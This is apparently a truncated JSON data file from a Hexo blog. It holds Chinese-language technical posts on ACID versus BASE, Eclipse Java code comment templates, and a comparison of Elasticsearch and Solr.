FF09;&#x3002;</p>\n<ul>\n<li><p><strong>&#x539F;&#x5B50;&#x6027;&#xFF1A;</strong>&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#xFF08;transaction&#xFF09;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x64CD;&#x4F5C;&#xFF0C;&#x8981;&#x4E48;&#x5168;&#x90E8;&#x5B8C;&#x6210;&#xFF0C;&#x8981;&#x4E48;&#x5168;&#x90E8;&#x4E0D;&#x5B8C;&#x6210;&#xFF0C;&#x4E0D;&#x4F1A;&#x7ED3;&#x675F;&#x5728;&#x4E2D;&#x95F4;&#x67D0;&#x4E2A;&#x73AF;&#x8282;&#x3002;&#x4E8B;&#x52A1;&#x5728;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#xFF0C;&#x4F1A;&#x88AB;&#x56DE;&#x6EDA;&#xFF08;Rollback&#xFF09;&#x5230;&#x4E8B;&#x52A1;&#x5F00;&#x59CB;&#x524D;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x5C31;&#x50CF;&#x8FD9;&#x4E2A;&#x4E8B;&#x52A1;&#x4ECE;&#x6765;&#x6CA1;&#x6709;&#x6267;&#x884C;&#x8FC7;&#x4E00;&#x6837;&#x3002;</p>\n</li>\n<li><p><strong>&#x4E00;&#x81F4;&#x6027;&#xFF1A;</strong>&#x5728;&#x4E8B;&#x52A1;&#x5F00;&#x59CB;&#x4E4B;&#x524D;&#x548C;&#x4E8B;&#x52A1;&#x7ED3;&#x675F;&#x4EE5;&#x540E;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5B8C;&#x6574;&#x6027;&#x6CA1;&#x6709;&#x88AB;&#x7834;&#x574F;&#x3002;&#x8FD9;&#x8868;&#x793A;&#x5199;&#x5165;&#x7684;&#x8D44;&#x6599;&#x5FC5;&#x987B;&#x5B8C;&#x5168;&#x7B26;&#x5408;&#x6240;&#x6709;&#x7684;&#x9884;&#x8BBE;&#x89C4;&#x5219;&#xFF0C;&#x8FD9;&#x5305;&#x542B;&#x8D44;&#x6599;&#x7684;&#x7CBE;&#x786E;&#x5EA6;&#x3001;&#x4E32;&#x8054;&#x6027;&#x4EE5;&#x53CA;&#x540E;&#x7EED;&#x6570;&#x636E;&#x5E93;&#x53EF;&#x4EE5;&#x81EA;&#x53D1;&#x6027;&#x5730;&#x5B8C;&#x6210;&#x9884;&#x5B9A;&#x7684;&#x5DE5;&#x4F5C;&#x3002;</p>\n</li>\n<li><p><strong>&#x9694;&#x79BB;&#x6027;&#xFF1A;</strong>&#x6570;&#x636E;&#x5E93;&#x5141;&#x8BB8;&#x591A;&#x4E2A;&#x5E76;&#x53D1;&#x4E8B;&#x52A1;&#x540C;&#x65F6;&#x5BF9;&#x9F50;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x8BFB;&#x5199;&#x548C;&#x4FEE;&#x6539;&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x9694;&#x79BB;&#x6027;&#x53EF;&#x4EE5;&#x9632;&#x6B62;&#x591A;&#x4E2A;&#x4E8B;&#x52A1;&#x5E76;&#x53D1;&#x6267;&#x884C;&#x65F6;&#x7531;&#x4E8E;&#x4EA4;&#x53C9;&#x6267;&#x884C;&#x800C;&#x5BFC;&#x81F4;&#x6570;&#x636E;&#x7684;&#x4E0D;&#x4E00;&#x81F4;&#x3002;&#x4E8B;&#x52A1;&#x9694;&#x79BB;&#x5206;&#x4E3A;&#x4E0D;&#x540C;&#x7EA7;&#x522B;&#xFF0C;&#x5305;&#x62EC;&#x8BFB;&#x672A;&#x63D0;&#x4EA4;&#xFF08;Read uncommitted&#xFF09;&#x3001;&#x8BFB;&#x63D0;&#x4EA4;&#xFF08;read committed&#xFF09;&#x3001;&#x53EF;&#x91CD;&#x590D;&#x8BFB;&#xFF08;repeatable read&#xFF09;&#x548C;&#x4E32;&#x884C;&#x5316;&#xFF08;Serializable&#xFF09;&#x3002;</p>\n</li>\n<li><p><strong>&#x6301;&#x4E45;&#x6027;&#xFF1A;</strong>&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x7ED3;&#x675F;&#x540E;&#xFF0C;&#x5BF9;&#x6570;&#x636E;&#x7684;&#x4FEE;&#x6539;&#x5C31;&#x662F;&#x6C38;&#x4E45;&#x7684;&#xFF0C;&#x5373;&#x4FBF;&#x7CFB;&#x7EDF;&#x6545;&#x969C;&#x4E5F;&#x4E0D;&#x4F1A;&#x4E22;&#x5931;&#x3002;</p>\n</li>\n</ul>\n<p>ACID&#x662F;&#x4F20;&#x7EDF;&#x6570;&#x636E;&#x5E93;&#x5E38;&#x7528;&#x7684;&#x8BBE;&#x8BA1;&#x7406;&#x5FF5;, &#x8FFD;&#x6C42;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;&#x3002;BASE&#x652F;&#x6301;&#x7684;&#x662F;&#x5927;&#x578B;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#xFF0C;&#x63D0;&#x51FA;&#x901A;&#x8FC7;&#x727A;&#x7272;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#x83B7;&#x5F97;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x3002;</p>\n<p><strong>ACID&#x548C;BASE&#x4EE3;&#x8868;&#x4E86;&#x4E24;&#x79CD;&#x622A;&#x7136;&#x76F8;&#x53CD;&#x7684;&#x8BBE;&#x8BA1;&#x54F2;&#x5B66;&#xFF0C;&#x5206;&#x5904;&#x3010;&#x4E00;&#x81F4;&#x6027;-&#x53EF;&#x7528;&#x6027;&#x3011;&#x5206;&#x5E03;&#x56FE;&#x8C31;&#x7684;&#x4E24;&#x6781;&#x3002;</strong></p>"},{"title":"Code Templates设置","date":"2016-05-18T11:13:52.000Z","toc":false,"_content":"\n### IDE配置地址：\nWindow->Preferences->Java->Code Style->Code Templates\n\n### 我的默认配置：\n**comments-->files:**\n```\n/**\n * @Project Name:${project_name}\n * @File Name:${file_name}\n * @Package Name:${package_name}\n * @Date:${date}${time}\n */\n```\n\n**comments-->types:**\n```\n/**\n * @ClassName: ${type_name}\n * @Description: ${todo}\n * @author Wasim\n * @Date: ${date} ${time}\n */\n```\n<!-- more -->\n**comments-->methods:**\n```\n/**\n * @Title: ${enclosing_method}\n * @author Wasim\n * @Date: ${date} ${time}\n * @param ${tags}\n * @return ${return_type}\n */\n```\n\n**code-->New Java files:**\n```\n/** \n * Project Name:${project_name} \n * File Name:${file_name} \n * Package Name:${package_name} \n * Date:${date}${time} \n * Copyright (c) ${year}, wasim37@163.com All Rights Reserved. \n*/  \n${filecomment}  \n  \n${package_declaration} \n\n/**\n * @ClassName: ${type_name}\n * @Description: ${todo}\n * @author Wasim\n * @Date: ${date} ${time}\n */\n${typecomment}  \n${type_declaration}  \n```\n","source":"_posts/Code Templates设置.md","raw":"---\ntitle: Code Templates设置\ncategories:\n  - WEB后端\ndate: 2016-5-18 19:13:52\ntoc: false\n\n---\n\n### IDE配置地址：\nWindow->Preferences->Java->Code Style->Code Templates\n\n### 我的默认配置：\n**comments-->files:**\n```\n/**\n * @Project Name:${project_name}\n * @File Name:${file_name}\n * @Package Name:${package_name}\n * @Date:${date}${time}\n */\n```\n\n**comments-->types:**\n```\n/**\n * @ClassName: ${type_name}\n * @Description: ${todo}\n * @author Wasim\n * @Date: ${date} ${time}\n */\n```\n<!-- more -->\n**comments-->methods:**\n```\n/**\n * @Title: ${enclosing_method}\n * @author Wasim\n * @Date: ${date} ${time}\n * @param ${tags}\n * @return ${return_type}\n */\n```\n\n**code-->New Java files:**\n```\n/** \n * Project Name:${project_name} \n * File Name:${file_name} \n * Package Name:${package_name} \n * Date:${date}${time} \n * Copyright (c) ${year}, wasim37@163.com All Rights Reserved. \n*/  \n${filecomment}  \n  \n${package_declaration} \n\n/**\n * @ClassName: ${type_name}\n * @Description: ${todo}\n * @author Wasim\n * @Date: ${date} ${time}\n */\n${typecomment}  \n${type_declaration}  \n```\n","slug":"Code Templates设置","published":1,"updated":"2016-11-17T11:59:42.660Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulai0009gwtm78gi3so4","content":"<h3 id=\"IDE&#x914D;&#x7F6E;&#x5730;&#x5740;&#xFF1A;\"><a href=\"#IDE&#x914D;&#x7F6E;&#x5730;&#x5740;&#xFF1A;\" class=\"headerlink\" title=\"IDE&#x914D;&#x7F6E;&#x5730;&#x5740;&#xFF1A;\"></a>IDE&#x914D;&#x7F6E;&#x5730;&#x5740;&#xFF1A;</h3><p>Window-&gt;Preferences-&gt;Java-&gt;Code Style-&gt;Code Templates</p>\n<h3 id=\"&#x6211;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF1A;\"><a href=\"#&#x6211;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF1A;\" class=\"headerlink\" title=\"&#x6211;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF1A;\"></a>&#x6211;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF1A;</h3><p><strong>comments&#x2013;&gt;files:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * @Project Name:${project_name}</span><br><span class=\"line\"> * @File Name:${file_name}</span><br><span class=\"line\"> * @Package Name:${package_name}</span><br><span class=\"line\"> * @Date:${date}${time}</span><br><span class=\"line\"> */</span><br></pre></td></tr></table></figure></p>\n<p><strong>comments&#x2013;&gt;types:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * @ClassName: ${type_name}</span><br><span class=\"line\"> * @Description: ${todo}</span><br><span class=\"line\"> * @author Wasim</span><br><span class=\"line\"> * @Date: ${date} ${time}</span><br><span class=\"line\"> */</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p><strong>comments&#x2013;&gt;methods:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * @Title: ${enclosing_method}</span><br><span class=\"line\"> * @author Wasim</span><br><span class=\"line\"> * @Date: ${date} ${time}</span><br><span class=\"line\"> * @param ${tags}</span><br><span class=\"line\"> * @return ${return_type}</span><br><span class=\"line\"> */</span><br></pre></td></tr></table></figure></p>\n<p><strong>code&#x2013;&gt;New Java files:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** </span><br><span class=\"line\"> * Project Name:${project_name} </span><br><span class=\"line\"> * File Name:${file_name} </span><br><span class=\"line\"> * Package Name:${package_name} </span><br><span class=\"line\"> * Date:${date}${time} </span><br><span class=\"line\"> * Copyright (c) ${year}, wasim37@163.com All Rights Reserved. </span><br><span class=\"line\">*/  </span><br><span class=\"line\">${filecomment}  </span><br><span class=\"line\">  </span><br><span class=\"line\">${package_declaration} </span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * @ClassName: ${type_name}</span><br><span class=\"line\"> * @Description: ${todo}</span><br><span class=\"line\"> * @author Wasim</span><br><span class=\"line\"> * @Date: ${date} ${time}</span><br><span class=\"line\"> */</span><br><span class=\"line\">${typecomment}  </span><br><span class=\"line\">${type_declaration}</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<h3 id=\"IDE&#x914D;&#x7F6E;&#x5730;&#x5740;&#xFF1A;\"><a href=\"#IDE&#x914D;&#x7F6E;&#x5730;&#x5740;&#xFF1A;\" class=\"headerlink\" title=\"IDE&#x914D;&#x7F6E;&#x5730;&#x5740;&#xFF1A;\"></a>IDE&#x914D;&#x7F6E;&#x5730;&#x5740;&#xFF1A;</h3><p>Window-&gt;Preferences-&gt;Java-&gt;Code Style-&gt;Code Templates</p>\n<h3 id=\"&#x6211;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF1A;\"><a href=\"#&#x6211;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF1A;\" class=\"headerlink\" title=\"&#x6211;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF1A;\"></a>&#x6211;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF1A;</h3><p><strong>comments&#x2013;&gt;files:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * @Project Name:${project_name}</span><br><span class=\"line\"> * @File Name:${file_name}</span><br><span class=\"line\"> * @Package Name:${package_name}</span><br><span class=\"line\"> * @Date:${date}${time}</span><br><span class=\"line\"> */</span><br></pre></td></tr></table></figure></p>\n<p><strong>comments&#x2013;&gt;types:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * @ClassName: ${type_name}</span><br><span class=\"line\"> * @Description: ${todo}</span><br><span class=\"line\"> * @author Wasim</span><br><span class=\"line\"> * @Date: ${date} ${time}</span><br><span class=\"line\"> */</span><br></pre></td></tr></table></figure></p>","more":"<p><strong>comments&#x2013;&gt;methods:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * @Title: ${enclosing_method}</span><br><span class=\"line\"> * @author Wasim</span><br><span class=\"line\"> * @Date: ${date} ${time}</span><br><span class=\"line\"> * @param ${tags}</span><br><span class=\"line\"> * @return ${return_type}</span><br><span class=\"line\"> */</span><br></pre></td></tr></table></figure></p>\n<p><strong>code&#x2013;&gt;New Java files:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** </span><br><span class=\"line\"> * Project Name:${project_name} </span><br><span class=\"line\"> * File Name:${file_name} </span><br><span class=\"line\"> * Package Name:${package_name} </span><br><span class=\"line\"> * Date:${date}${time} </span><br><span class=\"line\"> * Copyright (c) ${year}, wasim37@163.com All Rights Reserved. </span><br><span class=\"line\">*/  </span><br><span class=\"line\">${filecomment}  </span><br><span class=\"line\">  </span><br><span class=\"line\">${package_declaration} </span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * @ClassName: ${type_name}</span><br><span class=\"line\"> * @Description: ${todo}</span><br><span class=\"line\"> * @author Wasim</span><br><span class=\"line\"> * @Date: ${date} ${time}</span><br><span class=\"line\"> */</span><br><span class=\"line\">${typecomment}  </span><br><span class=\"line\">${type_declaration}</span><br></pre></td></tr></table></figure></p>"},{"title":"Elasticsearch与Solr","date":"2016-07-12T13:18:00.000Z","toc":false,"_content":"\n> 公司之前有个用Lucene实现的伪分布式项目，实时性很差，后期数据量逐渐增大的时候，数据同步一次需要十几小时。当时项目重构考虑到的是Solr和ES，我参与的是Solr技术的预研。因为项目实时性要求很高，最终选择的是ES。\n\n## Elasticsearch\n\n#### 简介\nElasticsearch是一个实时的分布式搜索和分析引擎。它可以帮助你用前所未有的速度去处理大规模数据。它可以用于全文搜索，结构化搜索以及分析，当然你也可以将这三者进行组合。\n\nElasticsearch是一个建立在全文搜索引擎 Apache Lucene™ 基础上的搜索引擎，可以说Lucene是当今最先进，最高效的全功能开源搜索引擎框架。但是Lucene只是一个框架，要充分利用它的功能，需要使用JAVA，并且在程序中集成Lucene。需要很多的学习了解，才能明白它是如何运行的，Lucene确实非常复杂。\n\nElasticsearch使用Lucene作为内部引擎，但是在使用它做全文搜索时，只需要使用统一开发好的API即可，而不需要了解其背后复杂的Lucene的运行原理。\n\n<!-- more -->\n\n当然Elasticsearch并不仅仅是Lucene这么简单，它不但包括了全文搜索功能，还可以进行以下工作:\n1、分布式实时文件存储，并将每一个字段都编入索引，使其可以被搜索。\n2、实时分析的分布式搜索引擎。\n3、可以扩展到上百台服务器，处理PB级别的结构化或非结构化数据。\n\n这么多的功能被集成到一台服务器上，你可以轻松地通过客户端或者任何你喜欢的程序语言与ES的RESTful API进行交流。Elasticsearch的上手是非常简单的。它附带了很多非常合理的默认值，这让初学者很好地避免一上手就要面对复杂的理论，它安装好了就可以使用了，用很小的学习成本就可以变得很有生产力。\n\n随着越学越深入，还可以利用Elasticsearch更多高级的功能，整个引擎可以很灵活地进行配置。可以根据自身需求来定制属于自己的Elasticsearch。\n\n使用案例：\n1、维基百科使用Elasticsearch来进行全文搜做并高亮显示关键词，以及提供search-as-you-type、did-you-mean等搜索建议功能。\n2、英国卫报使用Elasticsearch来处理访客日志，以便能将公众对不同文章的反应实时地反馈给各位编辑。\n3、StackOverflow将全文搜索与地理位置和相关信息进行结合，以提供more-like-this相关问题的展现。\n4、GitHub使用Elasticsearch来检索超过1300亿行代码。\n5、每天，Goldman Sachs使用它来处理5TB数据的索引，还有很多投行使用它来分析股票市场的变动。\n但是Elasticsearch并不只是面向大型企业的，它还帮助了很多类似DataDog以及Klout的创业公司进行了功能的扩展。\n\n#### 优点\n- Elasticsearch是分布式的。不需要其他组件，分发是实时的，被叫做”Push replication”。\n- Elasticsearch 完全支持 Apache Lucene 的接近实时的搜索。\n- 处理多租户（multitenancy）不需要特殊配置，而Solr则需要更多的高级设置。\n- Elasticsearch 采用 Gateway 的概念，使得完备份更加简单。\n- 各节点组成对等的网络结构，某些节点出现故障时会自动分配其他节点代替其进行工作。\n\n#### 缺点\n- 只有一名开发者（当前Elasticsearch GitHub组织已经不只如此，已经有了相当活跃的维护者）\n- 还不够自动（不适合当前新的Index Warmup API）\n\n- - -\n\n## Solr\n\n#### 简介\nSolr（读作“solar”）是Apache Lucene项目的开源企业搜索平台。\n其主要功能包括全文检索、命中标示、分面搜索、动态聚类、数据库集成，以及富文本（如Word、PDF）的处理。\nSolr是高度可扩展的，并提供了分布式搜索和索引复制。\nSolr是最流行的企业级搜索引擎，Solr4 还增加了NoSQL支持。\nSolr是用Java编写、运行在Servlet容器（如 Apache Tomcat 或Jetty）的一个独立的全文搜索服务器。\nSolr采用了 Lucene Java搜索库为核心的全文索引和搜索，并具有类似REST的HTTP/XML和JSON的API。\nSolr强大的外部配置功能使得无需进行Java编码，便可对其进行调整以适应多种类型的应用程序。Solr有一个插件架构，以支持更多的高级定制。\n\n因为2010年 Apache Lucene 和 Apache Solr 项目合并，两个项目是由同一个Apache软件基金会开发团队制作实现的。提到技术或产品时，Lucene/Solr或Solr/Lucene是一样的。\n\n#### 优点\n- Solr比较成熟、稳定。\n- Solr有一个更大、更成熟的用户、开发和贡献者社区。\n- 支持添加多种格式的索引，如：HTML、PDF、微软 Office 系列软件格式以及 JSON、XML、CSV 等纯文本格式。\n- 不考虑建索引的同时进行搜索，速度更快。\n\n#### 缺点\n**建立索引时，搜索效率下降，实时索引搜索效率不高。**\n\n- - -\n\n## Elasticsearch与Solr的比较\n当单纯的对已有数据进行搜索时，Solr更快。\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/Elasticsearch%E4%B8%8ESolr/1.png)\n当实时建立索引时, Solr会产生io阻塞，查询性能较差, Elasticsearch具有明显的优势。\n![图片2](http://7xvfir.com1.z0.glb.clouddn.com/Elasticsearch%E4%B8%8ESolr/2.png)\n随着数据量的增加，Solr的搜索效率会变得更低，而Elasticsearch却没有明显的变化。\n![图片3](http://7xvfir.com1.z0.glb.clouddn.com/Elasticsearch%E4%B8%8ESolr/3.png)\n综上所述，Solr的架构不适合实时搜索的应用。\n\n下图为将搜索引擎从Solr转到Elasticsearch以后的平均查询速度有了50倍的提升。\n![图片4](http://7xvfir.com1.z0.glb.clouddn.com/Elasticsearch%E4%B8%8ESolr/4.png)\n\n#### Elasticsearch 与 Solr 的比较总结\n- 二者安装都很简单；\n- Solr 利用 Zookeeper 进行分布式管理，而 Elasticsearch 自身带有分布式协调管理功能;\n- Solr 支持更多格式的数据，而 Elasticsearch 仅支持json文件格式；\n- Solr 官方提供的功能更多，而 Elasticsearch 本身更注重于核心功能，高级功能多有第三方插件提供；\n- Solr 在传统的搜索应用中表现好于 Elasticsearch，但在处理实时搜索应用时效率明显低于 Elasticsearch。\n- Solr 是传统搜索应用的有力解决方案，但 Elasticsearch 更适用于新兴的实时搜索应用。\n\n- - -\n\n## 其他基于Lucene的开源搜索引擎解决方案\n#### Lucene\n说明：Lucene 是一个 JAVA 搜索类库，它本身并不是一个完整的解决方案，需要额外的开发工作。\n优点：成熟的解决方案，有很多的成功案例。apache 顶级项目，正在持续快速的进步。庞大而活跃的开发社区，大量的开发人员。它只是一个类库，有足够的定制和优化空间：经过简单定制，就可以满足绝大部分常见的需求；经过优化，可以支持 10亿+ 量级的搜索。\n缺点：需要额外的开发工作。所有的扩展，分布式，可靠性等都需要自己实现；非实时，从建索引到可以搜索中间有一个时间延迟，而当前的“近实时”(Lucene Near Real Time search)搜索方案的可扩展性有待进一步完善\n\n#### Katta\n说明：基于 Lucene 的，支持分布式，可扩展，具有容错功能，准实时的搜索方案。\n优点：开箱即用，可以与 Hadoop 配合实现分布式。具备扩展和容错机制。\n缺点：只是搜索方案，建索引部分还是需要自己实现。在搜索功能上，只实现了最基本的需求。成功案例较少，项目的成熟度稍微差一些。因为需要支持分布式，对于一些复杂的查询需求，定制的难度会比较大。\n\n#### Hadoop contrib/index\n说明：Map/Reduce 模式的，分布式建索引方案，可以跟 Katta 配合使用。\n优点：分布式建索引，具备可扩展性。\n缺点：只是建索引方案，不包括搜索实现。工作在批处理模式，对实时搜索的支持不佳。\n\n#### LinkedIn 的开源方案\n说明：基于 Lucene 的一系列解决方案，包括 准实时搜索 zoie ，facet 搜索实现 bobo ，机器学习算法 decomposer ，摘要存储库 krati ，数据库模式包装 sensei 等等\n优点：经过验证的解决方案，支持分布式，可扩展，丰富的功能实现\n缺点：与 linkedin 公司的联系太紧密，可定制性比较差\n\n#### Lucandra\n说明：基于 Lucene，索引存在 cassandra 数据库中\n优点：参考 cassandra 的优点\n缺点：参考 cassandra 的缺点。另外，这只是一个 demo，没有经过大量验证\n\n#### HBasene\n说明：基于 Lucene，索引存在 HBase 数据库中\n优点：参考 HBase 的优点\n缺点：参考 HBase 的缺点。另外，在实现中，lucene terms 是存成行，但每个 term 对应的 posting lists 是以列的方式存储的。随着单个 term 的 posting lists 的增大，查询时的速度受到的影响会非常大","source":"_posts/Elasticsearch与Solr.md","raw":"---\ntitle: Elasticsearch与Solr\ncategories:\n  - 其他技术\ntags:\n  - ES\n  - solr\ndate: 2016-7-12 21:18:00\ntoc: false\n\n---\n\n> 公司之前有个用Lucene实现的伪分布式项目，实时性很差，后期数据量逐渐增大的时候，数据同步一次需要十几小时。当时项目重构考虑到的是Solr和ES，我参与的是Solr技术的预研。因为项目实时性要求很高，最终选择的是ES。\n\n## Elasticsearch\n\n#### 简介\nElasticsearch是一个实时的分布式搜索和分析引擎。它可以帮助你用前所未有的速度去处理大规模数据。它可以用于全文搜索，结构化搜索以及分析，当然你也可以将这三者进行组合。\n\nElasticsearch是一个建立在全文搜索引擎 Apache Lucene™ 基础上的搜索引擎，可以说Lucene是当今最先进，最高效的全功能开源搜索引擎框架。但是Lucene只是一个框架，要充分利用它的功能，需要使用JAVA，并且在程序中集成Lucene。需要很多的学习了解，才能明白它是如何运行的，Lucene确实非常复杂。\n\nElasticsearch使用Lucene作为内部引擎，但是在使用它做全文搜索时，只需要使用统一开发好的API即可，而不需要了解其背后复杂的Lucene的运行原理。\n\n<!-- more -->\n\n当然Elasticsearch并不仅仅是Lucene这么简单，它不但包括了全文搜索功能，还可以进行以下工作:\n1、分布式实时文件存储，并将每一个字段都编入索引，使其可以被搜索。\n2、实时分析的分布式搜索引擎。\n3、可以扩展到上百台服务器，处理PB级别的结构化或非结构化数据。\n\n这么多的功能被集成到一台服务器上，你可以轻松地通过客户端或者任何你喜欢的程序语言与ES的RESTful API进行交流。Elasticsearch的上手是非常简单的。它附带了很多非常合理的默认值，这让初学者很好地避免一上手就要面对复杂的理论，它安装好了就可以使用了，用很小的学习成本就可以变得很有生产力。\n\n随着越学越深入，还可以利用Elasticsearch更多高级的功能，整个引擎可以很灵活地进行配置。可以根据自身需求来定制属于自己的Elasticsearch。\n\n使用案例：\n1、维基百科使用Elasticsearch来进行全文搜做并高亮显示关键词，以及提供search-as-you-type、did-you-mean等搜索建议功能。\n2、英国卫报使用Elasticsearch来处理访客日志，以便能将公众对不同文章的反应实时地反馈给各位编辑。\n3、StackOverflow将全文搜索与地理位置和相关信息进行结合，以提供more-like-this相关问题的展现。\n4、GitHub使用Elasticsearch来检索超过1300亿行代码。\n5、每天，Goldman Sachs使用它来处理5TB数据的索引，还有很多投行使用它来分析股票市场的变动。\n但是Elasticsearch并不只是面向大型企业的，它还帮助了很多类似DataDog以及Klout的创业公司进行了功能的扩展。\n\n#### 优点\n- Elasticsearch是分布式的。不需要其他组件，分发是实时的，被叫做”Push replication”。\n- Elasticsearch 完全支持 Apache Lucene 的接近实时的搜索。\n- 处理多租户（multitenancy）不需要特殊配置，而Solr则需要更多的高级设置。\n- Elasticsearch 采用 Gateway 的概念，使得完备份更加简单。\n- 各节点组成对等的网络结构，某些节点出现故障时会自动分配其他节点代替其进行工作。\n\n#### 缺点\n- 只有一名开发者（当前Elasticsearch GitHub组织已经不只如此，已经有了相当活跃的维护者）\n- 还不够自动（不适合当前新的Index Warmup API）\n\n- - -\n\n## Solr\n\n#### 简介\nSolr（读作“solar”）是Apache Lucene项目的开源企业搜索平台。\n其主要功能包括全文检索、命中标示、分面搜索、动态聚类、数据库集成，以及富文本（如Word、PDF）的处理。\nSolr是高度可扩展的，并提供了分布式搜索和索引复制。\nSolr是最流行的企业级搜索引擎，Solr4 还增加了NoSQL支持。\nSolr是用Java编写、运行在Servlet容器（如 Apache Tomcat 或Jetty）的一个独立的全文搜索服务器。\nSolr采用了 Lucene Java搜索库为核心的全文索引和搜索，并具有类似REST的HTTP/XML和JSON的API。\nSolr强大的外部配置功能使得无需进行Java编码，便可对其进行调整以适应多种类型的应用程序。Solr有一个插件架构，以支持更多的高级定制。\n\n因为2010年 Apache Lucene 和 Apache Solr 项目合并，两个项目是由同一个Apache软件基金会开发团队制作实现的。提到技术或产品时，Lucene/Solr或Solr/Lucene是一样的。\n\n#### 优点\n- Solr比较成熟、稳定。\n- Solr有一个更大、更成熟的用户、开发和贡献者社区。\n- 支持添加多种格式的索引，如：HTML、PDF、微软 Office 系列软件格式以及 JSON、XML、CSV 等纯文本格式。\n- 不考虑建索引的同时进行搜索，速度更快。\n\n#### 缺点\n**建立索引时，搜索效率下降，实时索引搜索效率不高。**\n\n- - -\n\n## Elasticsearch与Solr的比较\n当单纯的对已有数据进行搜索时，Solr更快。\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/Elasticsearch%E4%B8%8ESolr/1.png)\n当实时建立索引时, Solr会产生io阻塞，查询性能较差, 